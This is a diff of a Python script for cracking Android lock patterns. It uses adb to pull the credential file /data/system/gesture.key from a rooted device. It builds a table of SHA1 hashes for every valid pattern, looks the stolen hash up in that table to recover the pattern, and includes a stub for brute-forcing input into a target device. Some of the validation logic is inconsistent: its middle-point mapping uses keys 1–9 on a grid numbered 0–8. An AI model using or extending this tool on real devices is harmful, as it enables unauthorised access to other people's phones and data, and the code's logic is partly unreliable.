@@ -1,25 +1,30 @@
 """
      ___________________
     |                   |
-    | 9      8        7 |
+    | 0      1        2 |
     |                   | 
-    | 6      5        4 |
+    | 3      4        5 |
     |                   |
-    | 3      2        1 |
+    | 6      7        8 |
     |___________________|
 
     THE TUPLES
-    3-> (0,0)
-    2-> (0,1)
-    1-> (0,2)
-    6-> (1,0)
-    5-> (1,1)
-    4-> (1,2)
-    9-> (2,0)
-    8-> (2,1)
-    7-> (2,2)
+    6-> (0,0)
+    7-> (0,1)
+    8-> (0,2)
+    3-> (1,0)
+    4-> (1,1)
+    5-> (1,2)
+    0-> (2,0)
+    1-> (2,1)
+    2-> (2,2)
 """
-
+import binascii
+import hashlib
+import hmac
+import os
+import subprocess
+from itertools import permutations
 
 def generate_combinations(points):
     """
@@ -125,8 +130,6 @@ def remove_invalid_combinations(combinations):
 
     """
     valid_combinations = []
-    valid = True
-
     def check_previous(n, x, comb):
         """Checks if the middle point exists before the current point 
             Args:
@@ -134,70 +137,189 @@ def remove_invalid_combinations(combinations):
                 x (int): the middle point to check
                 comb (int): the current combination to check against
         """
-        for i in range(n, -1, -1):
-            if comb[i] == x:
-                return True
-        return False
+        return x in comb[:n+1]
+
+    # Mapping the extreme points to their middle points
+    mapping = {
+        (1, 3): 2,
+        (3, 1): 2,
+        (4, 6): 5,
+        (6, 4): 5,
+        (7, 9): 8,
+        (9, 7): 8,
+        (7, 1): 4,
+        (1, 7): 4,
+        (2, 8): 5,
+        (8, 2): 5,
+        (3, 9): 6,
+        (9, 3): 6,
+        (7, 3): 5,
+        (3, 7): 5,
+        (1, 9): 5,
+        (9, 1): 5
+    }
 
     for comb in combinations:
-        #Checking if comb is valid
-        for n in range(0,len(comb) -1):
-
-            if comb[n] in (1,3) and comb[n+1] in (1,3):
-                if check_previous(n,2,comb):
+        # Checking if comb is valid
+        valid = True
+        for n in range(0, len(comb) - 1):
+            if mapping.get((comb[n], comb[n+1])):
+                print("Extreme Points: ", comb[n], " and ", comb[n+1])
+                if check_previous(n, mapping[(comb[n], comb[n+1])], comb):
                     valid = True
                 else:
                     valid = False
                     break
-            elif comb[n] in (4,6) and comb[n+1] in (4,6):
-                if check_previous(n,5,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            elif comb[n] in (7,9) and comb[n+1] in (7,9):
-                if check_previous(n,8,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            elif comb[n] in (7,1) and comb[n+1] in (1,7):
-                if check_previous(n,4,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            elif comb[n] in (2,8) and comb[n+1] in (8,2):
-                if check_previous(n,5,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            elif comb[n] in (3,9) and comb[n+1] in (3,9):
-                if check_previous(n,6,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            elif (comb[n] in (7, 3) and comb[n+1] in (3, 7) or comb[n] in (1, 9) and comb[n+1] in (9, 1)):
-                if check_previous(n,5,comb):
-                    valid = True
-                else:
-                    valid = False
-                    break
-            valid = True        
+            valid = True
         if valid:
             valid_combinations.append(comb)
+
     return valid_combinations
 
-def visualizeHash(patternHash):
-    """
-        Create the corresponding pattern from a pattern hash
-    """
+def check_adb_connection():
+    try:
+        # Use the 'adb devices' command to list connected devices
+        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, check=True)
+        output = result.stdout
 
-def createPatternHash(pattern, hashingAlgorithm):
+        # Split the output into lines and check for connected devices
+        lines = output.strip().split('\n')[1:]
+        devices = [line.split('\t')[0] for line in lines if line.strip() != '']
+
+        if devices:
+            print("Connected devices:")
+            for device in devices:
+                print(device)
+            return True
+        else:
+            print("No devices are connected via USB.")
+            return False
+    except subprocess.CalledProcessError as e:
+        error_output = e.stderr
+        print("An error occurred while checking ADB connection:", error_output)
+        return False
+
+
+def grab_gesture_key():
     """
-        Create a hash representation of a function
+        Grab gesture.key from /data/system  -- Rooted devices only :)
 
     """
+    if check_adb_connection():
+        try:
+            result = subprocess.run(["adb", "pull", "/data/system/gesture.key"], capture_output=True, text=True, check=True)
+            print("gesture.key file has been successfully pulled from the device.")
+        except subprocess.CalledProcessError as e:
+            error_output = e.stderr
+            if "remote object '/data/system/gesture.key' does not exist" in error_output.lower():
+                print("The 'gesture.key' file does not exist on the device.")
+            else:
+                print("An error occurred while pulling the 'gesture.key' file:", error_output)
+                print("Make sure your device is rooted to access this file.")
+
+def mapPermutation(perm):
+    """
+        Does the following mapping
+             ___________________             _________________
+            |                   |           |                 |
+            | 0      1        2 |           | 9     8       7 |
+            |                   |           |                 |
+            | 3      4        5 | =====>    | 6     5       4 |      
+            |                   |           |                 |
+            | 6      7        8 |           | 3     2       1 |
+            |___________________|           |_________________|
+
+    """
+    comb = list(perm)
+    # Conversion table
+    conversion_table = {
+        0: 9,
+        1: 8,
+        2: 7,
+        3: 6,
+        4: 5,
+        5: 4,
+        6: 3,
+        7: 2,
+        8: 1
+    }
+
+    conversion_dict = {int(key): int(value) for key, value in conversion_table.items()}
+    mappedPerm = [conversion_dict.get(int(num), int(num)) for num in comb]
+    x=[]
+    y = [int(x)for x in mappedPerm]
+    x.append(y)
+    return ''.join(map(str, remove_invalid_combinations(x)))
     
+ 
+
+def hashPattern(pattern):
+    """
+        Create a hash representation of a pattern using SHA1 which is used by most android devices
+        
+    """
+    pattern = ''.join(str(c) for c in pattern)
+    pattern_hex = binascii.unhexlify(''.join('%02x' % (ord(c) - ord('0')) for c in pattern))
+    hashedpattern = hashlib.sha1(pattern_hex).hexdigest()
+    return hashedpattern
+
+
+def createPatternsHashFile():
+    """
+        Will create a file containing all possible patterns combinations and their corresponding hashes
+        FILE FORMAT:> sequence:hash
+    """
+    try: 
+        if os.path.isfile("patternHashes"):
+            return
+        numbers = list(range(9)) #List of numbers from 0 to 8
+        c = 0
+        with open ('patternHashes', 'w') as file:
+            for n in range(5,10):
+                for perm in permutations(numbers, n):
+                    # Verify if the permutation is a valid combination
+                    if len(mapPermutation(perm)) != 0:
+                        sequence = str(int(''.join(map(str,perm))))
+                        file.write(sequence+":"+hashPattern(sequence)+"\n")
+
+    except Exception as e:
+        print("An error occurred: ", str(e))
+                
+
+def visualizeHash(target_hash):
+    """
+        First obtain the corresponding pattern sequence from the rainbow tables of all hash sequences
+    """
+    pattern_hash_dict = {}
+    try:
+        with open("patternHashes", 'r') as file:
+            for line in file:
+                sequence, hash_value = line.strip().split(':')
+                pattern_hash_dict[hash_value] = sequence
+    except FileNotFoundError:
+        raise Exception("File not found")
+    except Exception as e:
+        raise Exception(f"An error occurred: {e}")
+        
+
+    return pattern_hash_dict.get(target_hash, None)
+
+
+    
+def compareHash(hash1: str, hash2:str) -> bool:
+    """
+    Compares two given hashes
+    Returns true if they match false otherwise
+    """
+    if hash1 is None or hash2 is None or not isinstance(hash1, str) or not isinstance(hash2, str):
+        return False
+
+    return hmac.compare_digest(hash1, hash2)
+
+def startBruteforce():
+    """
+        Start injecting the pattern in the target android device
+    """
+
+
+print(remove_invalid_combinations([[4,1,7,4]]))
